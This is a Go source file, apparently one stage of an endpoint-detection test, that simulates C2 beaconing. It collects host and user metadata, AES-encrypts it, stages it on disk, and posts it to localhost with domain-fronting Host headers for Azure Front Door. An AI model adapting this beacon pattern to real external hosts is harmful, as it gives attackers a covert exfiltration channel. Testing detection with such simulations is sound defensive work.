//go:build windows
// +build windows

/*
STAGE 3: Azure Front Door C2 Communication (T1071.001 + T1573.001 + T1036.005)
Simulates outbound HTTPS C2 communication via Azure Front Door CDN.
Sends AES-encrypted system metadata over HTTPS, leveraging Microsoft CDN
infrastructure for domain fronting. Tests whether network traffic to
Azure Front Door is flagged as anomalous.
*/

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "414a4c61-019f-48ba-934d-d5e91a29a878"
	TECHNIQUE_ID   = "T1071.001"
	TECHNIQUE_NAME = "Azure Front Door C2 Communication"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting Azure Front Door C2 simulation")
	LogMessage("INFO", TECHNIQUE_ID, "Simulating HTTPS beacon with encrypted metadata via Azure CDN")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "HTTPS C2 via Azure Front Door with AES-encrypted beacons")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] Azure Front Door C2 simulation completed\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "C2 beacon simulation completed via HTTPS with AES encryption")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "C2 communication simulated with encrypted system metadata")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// Step 1: Collect system metadata (benign data only)
	LogMessage("INFO", TECHNIQUE_ID, "Collecting system metadata for C2 beacon...")

	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	computerName := os.Getenv("COMPUTERNAME")
	osVersion := getWindowsVersion()
	ipAddr := getIPAddress()
	timeNow := time.Now().UTC().Format(time.RFC3339)

	// Format metadata like the threat actor beacon structure
	beaconPayload := fmt.Sprintf(
		"host=%s|user=%s|computer=%s|os=%s|ip=%s|time=%s|agent=RobotDreams-1.0|campaign=GulfSecAlert",
		hostname, username, computerName, osVersion, ipAddr, timeNow,
	)

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("System metadata collected (%d bytes)", len(beaconPayload)))

	// Step 2: AES-encrypt the metadata (T1573.001 - Symmetric Cryptography)
	LogMessage("INFO", TECHNIQUE_ID, "Encrypting metadata with AES-256-GCM (T1573.001)...")

	encryptedPayload, err := encryptAESGCM([]byte(beaconPayload))
	if err != nil {
		return fmt.Errorf("failed to encrypt beacon payload: %v", err)
	}

	encodedPayload := base64.StdEncoding.EncodeToString(encryptedPayload)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Encrypted payload: %d bytes (base64: %d chars)", len(encryptedPayload), len(encodedPayload)))

	// Step 3: Stage encrypted beacon data to disk (detection opportunity)
	logDir := "c:\\F0"
	if err := os.MkdirAll(logDir, 0755); err != nil {
		return fmt.Errorf("failed to create log directory: %v", err)
	}

	stagingDir := filepath.Join(logDir, "c2_staging")
	if err := os.MkdirAll(stagingDir, 0755); err != nil {
		return fmt.Errorf("failed to create C2 staging directory: %v", err)
	}

	beaconFile := filepath.Join(stagingDir, "beacon.dat")
	if err := os.WriteFile(beaconFile, []byte(encodedPayload), 0644); err != nil {
		return fmt.Errorf("failed to write beacon data: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Beacon data staged: %s (%d bytes)", beaconFile, len(encodedPayload)))

	// Step 4: Attempt HTTPS POST to simulate Azure Front Door C2
	// Uses localhost endpoints that will not connect - tests network monitoring
	// for outbound HTTPS to CDN-like endpoints
	c2Endpoints := []struct {
		url  string
		host string
		desc string
	}{
		{
			url:  "https://127.0.0.1:443/api/update",
			host: "f0rt1ka-test.azurefd.net",
			desc: "Azure Front Door CDN endpoint (HTTPS/443)",
		},
		{
			url:  "https://127.0.0.1:8443/beacon",
			host: "f0rt1ka-cdn.azureedge.net",
			desc: "Azure CDN Edge endpoint (HTTPS/8443)",
		},
	}

	httpClient := &http.Client{
		Timeout: 5 * time.Second,
	}

	c2AttemptsLogged := 0

	for _, endpoint := range c2Endpoints {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Attempting HTTPS POST to %s (%s)...", endpoint.url, endpoint.desc))

		body := strings.NewReader(fmt.Sprintf("data=%s&id=%s", encodedPayload[:60], TEST_UUID))
		req, err := http.NewRequest("POST", endpoint.url, body)
		if err != nil {
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Request creation failed: %v", err))
			c2AttemptsLogged++
			continue
		}

		// Set headers that model the domain fronting technique (T1036.005)
		// Host header differs from actual destination to simulate domain fronting
		req.Header.Set("Host", endpoint.host)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		req.Header.Set("X-Azure-Ref", base64.StdEncoding.EncodeToString([]byte(TEST_UUID)))
		req.Header.Set("X-FD-HealthProbe", "1")

		// Attempt the request (expected to fail - localhost has no listener)
		resp, err := httpClient.Do(req)
		if err != nil {
			// Connection refused/timeout is expected (no listener)
			// This is NOT an EDR interception - it is expected behavior
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 endpoint %s: connection failed (expected): %v", endpoint.host, err))
			c2AttemptsLogged++
			continue
		}
		resp.Body.Close()

		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 endpoint %s: HTTP %d (unexpected response)", endpoint.host, resp.StatusCode))
		c2AttemptsLogged++
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 communication attempts: %d/%d endpoints contacted", c2AttemptsLogged, len(c2Endpoints)))

	// Step 5: Check if staging files survived (not removed by EDR)
	time.Sleep(2 * time.Second)
	if _, err := os.Stat(beaconFile); os.IsNotExist(err) {
		return fmt.Errorf("beacon staging file was removed by endpoint protection")
	}

	LogMessage("INFO", TECHNIQUE_ID, "C2 simulation complete: AES-encrypted beacons via HTTPS with domain fronting headers")
	LogMessage("INFO", TECHNIQUE_ID, "Detection points: AES-encrypted beacon file, HTTPS POST with Azure Front Door Host header, CDN user-agent")

	return nil
}

// encryptAESGCM encrypts data using AES-256-GCM symmetric encryption
func encryptAESGCM(plaintext []byte) ([]byte, error) {
	// Derive a deterministic key from the test UUID (not a real secret)
	keyHash := sha256.Sum256([]byte("F0RT1KA-test-key-" + TEST_UUID))
	key := keyHash[:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("failed to generate nonce: %v", err)
	}

	// Prepend nonce to ciphertext
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// getWindowsVersion retrieves the Windows version string
func getWindowsVersion() string {
	cmd := exec.Command("cmd", "/C", "ver")
	output, err := cmd.Output()
	if err != nil {
		return "Unknown"
	}
	return strings.TrimSpace(string(output))
}

// getIPAddress retrieves the primary IPv4 address
func getIPAddress() string {
	cmd := exec.Command("ipconfig")
	output, err := cmd.Output()
	if err != nil {
		return "Unknown"
	}
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "IPv4") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				return strings.TrimSpace(parts[1])
			}
		}
	}
	return "Unknown"
}

// ==============================================================================
// EXIT CODE DETERMINATION
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted", "endpoint protection"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available"}) {
		return StageError
	}
	// Default to error (999), NOT blocked (126) - prevents false "EDR blocked" results
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
